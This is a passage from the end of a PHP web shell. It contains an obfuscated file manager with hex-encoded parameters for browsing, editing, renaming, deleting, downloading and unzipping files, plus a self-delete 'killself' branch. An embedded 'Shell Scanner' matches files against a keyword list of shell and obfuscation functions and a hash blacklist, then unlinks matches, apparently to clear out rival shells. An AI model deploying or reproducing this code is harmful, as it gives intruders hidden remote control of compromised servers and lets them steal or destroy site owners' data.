        $pathinfo = strtolower($pathinfo);

        if (in_array($pathinfo, $ext)) {
            $sortedNotWritableFile[] = $entry;
        }
    }

    return array(
        'file_readable' => $sortedWritableFile,
        'file_not_readable' => $sortedNotWritableFile
    );
}

function getFileTokens($filename) {
    global $GNJ;
    
    // Replace short PHP tags with PHP tags
    $fileContent = $GNJ[6]($filename);
    $fileContent = $GNJ[41]('/<\?([^p=\w])/m', '<?php ', $fileContent);

    // Get the file tokens
    $token = token_get_all($fileContent);

    // Create an output array
    $output = array();

    // Iterate over the tokens and add the token types to the output array
    foreach ($token as $item) {
        if (isset($item[1])) {
            $output[] = strtolower($item[1]);
        }
    }

    // Remove any duplicate or empty tokens from the output array
    $output = array_values(array_unique(array_filter(array_map("trim", $output))));

    // Return the output array
    return $output;
}

function compareTokens($tokenNeedles, $tokenHaystack) {
    $output = array();
    foreach ($tokenNeedles as $tokenNeedle) {
        if (in_array($tokenNeedle, $tokenHaystack)) {
            $output[] = $tokenNeedle;
        }
    }
    return $output;
}

$ext = array(
    'php',
    'phps',
    'pht',
    'phpt',
    'phtm',
    'phtml',
    'phar',
    'php3',
    'php4',
    'php5',
    'php7',
    'shtml',
    'suspected'
);

$tokenNeedles = array(
    // Obfuscation
    'base64_decode',
    'rawurldecode',
    'urldecode',
    'gzinflate',
    'gzuncompress',
    'str_rot13',
    'convert_uu',
    'htmlspecialchars_decode',
    'bin2hex',
    'hex2bin',
    'hexdec',
    'chr',
    'strrev',
    'goto',
    'implode',
    'strtr',
    'extract',
    'parse_str', //works like extract if only one argument is given.
    'substr',
    'mb_substr',
    'str_replace',
    'substr_replace',
    'preg_replace', // able to do eval on match
    'exif_read_data',
    'readgzfile',

    // Shell / Process
    'eval',
    'exec',
    'shell_exec',
    'system',
    'passthru',
    'pcntl_fork',
    'fsockopen',
    'proc_open',
    'popen ',
    'assert', // identical to eval
    'posix_kill',
    'posix_setpgid',
    'posix_setsid',
    'posix_setuid',
    'proc_nice',
    'proc_close',
    'proc_terminate',
    'apache_child_terminate',

    // Server Information
    'posix_getuid',
    'posix_geteuid',
    'posix_getegid',
    'posix_getpwuid',
    'posix_getgrgid',
    'posix_mkfifo',
    'posix_getlogin',
    'posix_ttyname',
    'getenv',
    'proc_get_status',
    'get_cfg_var',
    'disk_free_space',
    'disk_total_space',
    'diskfreespace',
    'getlastmo',
    'getmyinode',
    'getmypid',
    'getmyuid',
    'getmygid',
    'fileowner',
    'filegroup',
    'get_current_user',
    'pathinfo',
    'getcwd',
    'sys_get_temp_dir',
    'basename',
    'phpinfo',

    // Database
    'mysql_connect',
    'mysqli_connect',
    'mysqli_query',
    'mysql_query',

    // I/O
    'fopen',
    'fsockopen',
    'file_put_contents',
    'file_get_contents',
    'url_get_contents',
    'stream_get_meta_data',
    'move_uploaded_file',
    '$_files',
    'copy',
    'include',
    'include_once',
    'require',
    'require_once',
    '__file__',

    // Miscellaneous
    'mail',
    'putenv',
    'curl_init',
    'tmpfile',
    'allow_url_fopen',
    'ini_set',
    'set_time_limit',
    'session_start',
    'symlink',
    '__halt_compiler',
    '__compiler_halt_offset__',
    'error_reporting',
    'create_function',
    'get_magic_quotes_gpc',
    '$auth_pass',
    '$password',
    '$pass',
);
$blacklistMD5Sums = array(
    'da18ee332089bc79e5906d254e05da85', // adminer
    'd68181147fd360e501a8c47a8f11db12',
    'cde87e013ff1042438a61eba13a8b84f',
    '984a207fe749cf6c3ae5def462b25cb8',
    '5ecdefd3914452f29dc01b53af1dae62',
    '52282a4579f6c97c0ea26b153bbaedfc',
    '0e631fea018d9acbea134a89fb89ed9d',
    '9cef8472ff468b3c36ae04cdc2ff5e57',
    '23f5c862d6b537bbd220cab81cfde3e9',
    '810bcc06123b712c67120c00bc1f97ea',
    '11b4c780f460b91be40d1bf831c8dabd',
    'e5327e50ab0e5805a91ca4bb844178df',
    '06fe42819e916f85df5e330c168f43dc',
    '37e729fadce14aab41ad45c4b9adb76e',
    '7c58272b434fd8ffda14ce21a9df34b5',
    'a2b5342a539fb9d65f90a4c501160774',
    'ab767da87df14fe0850717c02848d190',
    '445e63fa6adf1de27cae31aefca7e1d0',
    '4753c4379a6f7204e343ad83d3ffebcf',
    '261b87beaa63e785d94a002630184c1e',
    '4de688d75d5659c57a193a1bdbd5ab14',
    '9cef8472ff468b3c36ae04cdc2ff5e57', //jfu
    '6ebc6f001db13eb0ba353c8dae2d2de4',
    'b43c94ea8e371f08cec65f78b9b7cc3d',
    'd36a7ca98675a5efb2f21987b7d82bf7',
    'f8518441192a31c0461a79233c19c0d1',
    '77dbc95f089574059ea71fbec588060d',
    '179af89c89370dcc3d6c8832eb394042',
    '331a7e445ae852339a4af0f5ac2866a4',
    'f42aea7b83c9532d2673d9712b41d785',
    'cd60beff30290e59e9e172af1ea2b13f',
    '5446efdda3ce337b27081bd38ef00ff6',
    'f042a553164e4ffdcf7025f90a9b7559',
    'd01d7f10beba62cc4b189a4973688308',
    'ac45d5d0ed24e176dab7acf222135728',
    'a763898649dd69c7e5920dd77d480753',
    'e057c74e8c7910886538d6e55d0b16e6',
    'e68cd7c45133c0c7b4ecbb7218677b00',
    'd148e3338a5bd87d7ed0f695d92b9dd1',
    '2dab5576695298f017741b114f67c3f1',
    '9a5f5586560f3c05a13ec0006bb3e76d',
    '6b2f5cad2a9fbe03d76be0cee82ef282',
    'd93f7529cc0b89631a55c1fecb3c98c0',
    'acd20b834347718afedebfbd6b46fbf2',
    '999ed45a021e280f3d6ccaa9d47cbe92',
    '881b2214024eb58bd8623fdad8044964',
    'b5c698c1944b6ee0187ea95a104b2a14',
    'c897d3bd4820bc96c72617d4102446d8',
    '96224fe86d2d20812147d400b559e632',
    'dd86d0bc2255302f7f32f3c04f03d24c',
    '6cc76080a7503fbe70812e6d793b885e',
    '0bacb1196e4a8ea56b244b6dcb4999d0',
    'e5ab6267248c146c6baed601050e7f1a',
    '11f1a6317420a0f4c1bdd94e66e94ca3',
    'b83ffbfceb357ba882e4fb99ce16321f',
    '521acf9fd3a5409fea57789b14d62105',
    '6b5bd3739b8613dde9542d18e7dc49b7',
    'c8a2e1635ebcf68467bd6bfa735402a5',
    'd22b34adf16fdc550919305d9ee91d60',
    'af4d38c2252f9202b7e2a6ccab4060dc',
    'ba10786b2cc4e20c1c293d1548e3c7ff', // jfu
    '1e8b306adec8018dfb69d5e8e3729824',
    '53b3f24e14b70630be42997fb3936c29',
    '99c57b96fb57dc0db53d9c08175aa046',
    '0be7021455370311604dd1d8897eece5', // eval-slider
    '9967ff7859969ed44a9c7e657a8c0a68',
    'dceb28731bd44e3f4acdc09ede08ced5',
    '1248c6d7450e632c765274d083160c83',
    '61e04d4a141040e112eb5be90831f5bc',
);
$content = $GNJ[6]('https://raw.githubusercontent.com/Cvar1984/sussyfinder/main/whitelist.txt');
$whitelistMD5Sums = explode("\n", $content);

echo '<hr><br>
<h2>Shell Scanner</h2>
<form method="POST" action=""  class="header-izz">
    <p>Dir&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; width:500px;" name="dir" value="'.$GNJ[3]().'" class = "form-control" >
    <br><br>
    <input class = "form-control" type="submit" name="submit" style="width: 150px; height: 40px; border-color=white;margin:10px 2px 0 2px;" value="Scan" class="kotak"></p>
</form></center><hr><br>';

if (isset($_POST['submit'])) { 
    echo '<table id="result" class="container-fluid">';
        $path = $_POST['dir'];
        $result = getSortedByExtension($path, $ext);

        $fileReadable = $result['file_readable'];
        $fileNotReadable = $result['file_not_readable'];
        $fileReadable = sortByLastModified($fileReadable);

        foreach ($fileReadable as $file) {
            $filePath = $GNJ[41]('/\/+/', '/', $file);
            $path_info = $GNJ[54]($filePath);
            $directory = $path_info['dirname'];
            $file_name = $path_info['basename'];
            $fileSum = md5_file($filePath);
            if (in_array($fileSum, $whitelistMD5Sums)) { // if in whitelist skip
                continue;
            } elseif (in_array($fileSum, $blacklistMD5Sums)) { // if in blacklist alert and remove
                echo '<tr><td><span style="color:red;">'.$filePath.'</span></td><td style="text-align: right;"><div class="d-grid gap-2 d-md-flex justify-content-md-end">
                <button type="button" class="btn btn-outline-light me-md-2" data-toggle="modal" data-target="#cmpDetailModal'.$filePath.'">Details</button>
                <a class="btn btn-outline-light ml-2" href="?d='.hex($directory).'&s='.hex($file_name).'" target="_blank">Show</button></td></tr></div>';
                unlink($filePath);
                continue;
            } // else check the token

            $tokens = getFileTokens($filePath);
            $cmp = compareTokens($tokenNeedles, $tokens);
            $cmp = $GNJ[40](', ', $cmp);
            
            if (!empty($cmp)) {
                $filenam = $GNJ[55](__FILE__); 
                echo '<tr><td><span style="color:wheat;">'.$filePath.'</span></td><td style="text-align: right;"><div class="d-grid gap-2 d-md-flex justify-content-md-end">
                <button type="button" class="btn btn-outline-light me-md-2" data-toggle="modal" data-target="#cmpDetailModal'.$filePath.'">Details</button>
                <a class="btn btn-outline-light ml-2" href="?d='.hex($directory).'&s='.hex($file_name).'" target="_blank">Show</button></td></tr></div>';
            }
            
            echo '<div class="modal fade" id="cmpDetailModal'.$filePath.'" tabindex="-1" role="dialog" aria-labelledby="cmpDetailModalLabel" aria-hidden="true">
                <div class="modal-dialog" role="document">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" id="cmpDetailModalLabel" style="color:black;">'.$GNJ[55]($filePath).'</h5>
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span aria-hidden="true">&times;</span>
                            </button>
                        </div>
                        <div class="modal-body">
                            <p style="color:black;">'.$cmp.'</p>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Tutup</button>
                        </div>
                    </div>
                </div>
            </div>';
        }
    }
echo '</table>';

    

} elseif (isset($_GET[hex("killself")])) {
    unset($_SESSION[md5($_SERVER["HTTP_HOST"])]);
    @unlink(__FILE__);
    print "<script>window.location='?';</script>";
} elseif (isset($_GET["n"])) {
    echo $a_ .
        "New File" .
        $b_ .
        '<label>File Name</label>
									<form action="" method="post">
										<input name="n" autocomplete="off" class="form-control col-md-3" type="text" value="">
										' .
        $d_ .
        '
								' .
        $c_;
    if (isset($_POST["n"])) {
        if (!$GNJ[25]($_POST["n"])) {
            ER();
        } else {
            OK();
        }
    }
} elseif (isset($_GET["r"])) {
    echo $a_ .
        uhex($_GET["r"]) .
        $b_ .
        '
									<form action="" method="post">
										<input name="r" autocomplete="off" class="form-control col-md-3" type="text" value="' .
        uhex($_GET["r"]) .
        '">
										' .
        $d_ .
        '
								' .
        $c_;
    if (isset($_POST["r"])) {
        if ($GNJ[26]($_POST["r"])) {
            ER();
        } else {
            if ($GNJ[27](uhex($_GET["r"]), $_POST["r"])) {
                OK();
            } else {
                ER();
            }
        }
    }
} elseif (isset($_GET["z"])) {
    $zip = new ZipArchive();
    $res = $zip->open(uhex($_GET["z"]));
    if ($res === true) {
        $zip->extractTo(uhex($_GET["d"]));
        $zip->close();
        OK();
    } else {
        ER();
    }
} else {
    echo '<table class = "table table-bordered mt-3" >
						<thead>
							<tr>
								<th><center> NAME </center></th>
								<th><center> TYPE </center></th>
								<th><center> SIZE </center></th>
								<th><center> LAST MODIFIED </center></th>
								<th><center> OWNER\GROUP </center></th>
								<th><center> PERMISSION </center></th>
								<th><center> ACTION </center></th>
							</tr>
						</thead>
						<tbody>
							
						';

    $h = "";
    $j = "";
    $w = $GNJ[13]($d);
    if ($GNJ[28]($w) || $GNJ[29]($w)) {
        foreach ($w as $c) {
            $e = $GNJ[14]("\\", "/", $d);
            if (!$GNJ[30]($c, ".zip")) {
                $zi = "";
            } else {
                $zi = '<a href="?d=' . hex($e) . "&z=" . hex($c) . '">U</a>';
            }
            if ($GNJ[31]("$d/$c")) {
                $o = "";
            } elseif (!$GNJ[32]("$d/$c")) {
                $o = " h";
            } else {
                $o = " w";
            }
            $s = $GNJ[34]("$d/$c") / 1024;
            $s = round($s, 3);
            if ($s >= 1024) {
                $s = round($s / 1024, 2) . " MB";
            } else {
                $s = $s . " KB";
            }
            if ($c != "." && $c != "..") {
                $GNJ[8]("$d/$c")
                    ? ($h .=
                        '<tr class="r">
							<td>
								<img src = "https://cdn1.iconfinder.com/data/icons/flat-business-icons/128/folder-512.png" width = "20px" height = "20px">
								<a class="ajx" href="?d=' .
                        hex($e) .
                        hex("/" . $c) .
                        '">' .
                        $c .
                        '</a>
							</td>
							<td><center>Dir</center></td>
							<td class="x">
								<center>-</center>
							</td>
							
							<td class="x">
							<center>
								<a class="ajx" href="?d=' .
                        hex($e) .
                        "&t=" .
                        hex($c) .
                        '">' .
                        $GNJ[20]("F d Y g:i:s", $GNJ[21]("$d/$c")) .
                        '</a>
								</center>
							</td>
							<td class = "x">
							<center>
							' .
                        $dirinfo["owner"] .
                        DIRECTORY_SEPARATOR .
                        $dirinfo["group"] .
                        '
							</center>
							</td>
							<td class="x">
							<center>
								<a class="ajx' .
                        $o .
                        '" href="?d=' .
                        hex($e) .
                        "&k=" .
                        hex($c) .
                        '">' .
                        x("$d/$c") .
                        '</a>
							</center>
							</td>
							<td class="x">
							<center>
								<a class="ajx" href="?d=' .
                        hex($e) .
                        "&r=" .
                        hex($c) .
                        '">Rename</a>
								<a class="ajx" href="?d=' .
                        hex($e) .
                        "&x=" .
                        hex($c) .
                        '">Delete</a>
								</center>
							</td>
						</tr>
						
						')
                    : ($j .=
                        '<tr class="r">
							<td>
							
								<img src = "https://cdn1.iconfinder.com/data/icons/flat-business-icons/128/document-512.png" width = "20px" height = "20px">
								<a class="ajx" href="?d=' .
                        hex($e) .
                        "&s=" .
                        hex($c) .
                        '">' .
                        $c .
                        '</a>
								
							</td>
							<td>
							<center>
							File
							</center>
							</td>
							<td class="x">
							<center>
								' .
                        $s .
                        '
								</center>
							</td>
							<td class="x">
							<center>
								<a class="ajx" href="?d=' .
                        hex($e) .
                        "&t=" .
                        hex($c) .
                        '">' .
                        $GNJ[20]("F d Y g:i:s", $GNJ[21]("$d/$c")) .
                        '</a>
								</center>
							</td>	
							<td>
							<center>
							' .
                        $dirinfo["owner"] .
                        DIRECTORY_SEPARATOR .
                        $dirinfo["group"] .
                        '
							</center>
							</td>
								<td class="x">
								<center>
							<a class="ajx' .
                        $o .
                        '" href="?d=' .
                        hex($e) .
                        "&k=" .
                        hex($c) .
                        '">' .
                        x("$d/$c") .
                        '</a>
							</center>
							</td>
							
							<td class="x">
								<center>
								<a class="ajx" href="?d=' .
                        hex($e) .
                        "&e=" .
                        hex($c) .
                        '">Edit</a>
								<a class="ajx" href="?d=' .
                        hex($e) .
                        "&r=" .
                        hex($c) .
                        '">Rename</a>
								<a href="?d=' .
                        hex($e) .
                        "&g=" .
                        hex($c) .
                        '">Download</a>
								' .
                        $zi .
                        '
								<a class="ajx" href="?d=' .
                        hex($e) .
                        "&x=" .
                        hex($c) .
                        '">Delete</a>
								</center>
							</td>
						</tr>
						
						');
            }
        }
    }

    echo $h;
    echo $j;
    echo '</tbody>
					
				</table>';
}
?>

				<footer class="x">
                
				</footer>
				<br>
				<?php if (isset($_GET["1"])) {
        echo $f;
    } elseif (isset($_GET["0"])) {
        echo $g;
    } else {
        null;
    } ?>
				<script>
					$(".ajx").click(function(t) {
						t.preventDefault();
						var e = $(this).attr("href");
						history.pushState("", "", e), $.get(e, function(t) {
							$("body").html(t)
						})
					});
				</script>
        </div>
        <br>
        <br>
	</body>

	</html>
	<?php
     function rec($j)
     {
         global $GNJ;
         if (trim($GNJ[54]($j, PATHINFO_BASENAME), ".") === "") {
             return;
         }
         if ($GNJ[8]($j)) {
             array_map(
                 "rec",
                 glob($j . DIRECTORY_SEPARATOR . "{,.}*", GLOB_BRACE | GLOB_NOSORT)
             );
             $GNJ[35]($j);
         } else {
             $GNJ[10]($j);
         }
     }
     function dre($y1, $y2)
     {
         global $GNJ;
         ob_start();
         $GNJ[16]($y1($y2));
         return $GNJ[36]();
     }
     function hex($n)
     {
         $y = "";
         for ($i = 0; $i < strlen($n); $i++) {
             $y .= dechex(ord($n[$i]));
         }
         return $y;
     }
     function uhex($y)
     {
         $n = "";
         for ($i = 0; $i < strlen($y) - 1; $i += 2) {
             $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    
         }
         return $n;
     }
     
    function OK()
    {
        global $GNJ, $d;
        assert();
        $encoded_d = bin2hex($d); // Mengubah variabel $d ke dalam format hex
        header("Location: ?d=$encoded_d&1"); // Menggunakan variabel yang telah diubah ke dalam format hex
        exit();
    }
    	
    	function ER()
    	{
    		global $GNJ, $d;
    		$GNJ[38](ob_end_clean());
    		header("Location: ?d=" . hex($d));
    		exit();
    	}
     
     function x($c)
     {
         global $GNJ;
         $x = $GNJ[24]($c);
         if (($x & 0xc000) == 0xc000) {
             $u = "s";
         } elseif (($x & 0xa000) == 0xa000) {
             $u = "l";
         } elseif (($x & 0x8000) == 0x8000) {
             $u = "-";
         } elseif (($x & 0x6000) == 0x6000) {
             $u = "b";
         } elseif (($x & 0x4000) == 0x4000) {
             $u = "d";
         } elseif (($x & 0x2000) == 0x2000) {
             $u = "c";
         } elseif (($x & 0x1000) == 0x1000) {
             $u = "p";
         } else {
             $u = "u";
         }
         $u .= $x & 0x0100 ? "r" : "-";
         $u .= $x & 0x0080 ? "w" : "-";
         $u .= $x & 0x0040 ? ($x & 0x0800 ? "s" : "x") : ($x & 0x0800 ? "S" : "-");
         $u .= $x & 0x0020 ? "r" : "-";
         $u .= $x & 0x0010 ? "w" : "-";
         $u .= $x & 0x0008 ? ($x & 0x0400 ? "s" : "x") : ($x & 0x0400 ? "S" : "-");
         $u .= $x & 0x0004 ? "r" : "-";
         $u .= $x & 0x0002 ? "w" : "-";
         $u .= $x & 0x0001 ? ($x & 0x0200 ? "t" : "x") : ($x & 0x0200 ? "T" : "-");
         return $u;
     }
     if (isset($_GET["g"])) {
         $GNJ[38]($GNJ[9]);
         header("Content-Type: application/octet-stream");
         header("Content-Transfer-Encoding: Binary");
         header("Content-Length: " . $GNJ[34](uhex($_GET["g"])));
         header(
             "Content-disposition: attachment; filename=\"" .
                 uhex($_GET["g"]) .
                 "\""
         );
         $GNJ[37](uhex($_GET["g"]));
     }


?>